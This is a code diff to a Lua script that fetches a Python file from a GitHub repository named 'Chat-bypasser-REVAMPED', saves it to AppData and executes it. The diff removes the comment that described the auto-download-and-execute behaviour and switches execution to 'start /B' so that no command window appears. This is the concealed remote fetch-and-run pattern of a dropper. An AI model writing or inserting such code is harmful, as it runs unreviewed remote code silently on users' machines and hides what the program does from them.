@@ -1,5 +1,3 @@
--- Lua script to auto-download and execute a Python script and save it to the AppData directory
-
 -- URL of the Python script to download
 local script_url = "https://raw.githubusercontent.com/Meganugger/Chat-bypasser-REVAMPED/refs/heads/main/Chat-bypasser-REVAMPED"  -- Replace with the actual URL
 
@@ -25,9 +23,9 @@ function download_script(url, path)
     end
 end
 
--- Function to execute the downloaded Python script
+-- Function to execute the downloaded Python script without showing the cmd prompt
 function execute_script(path)
-    local command = "python " .. path
+    local command = "start /B python " .. path
     os.execute(command)
 end
 
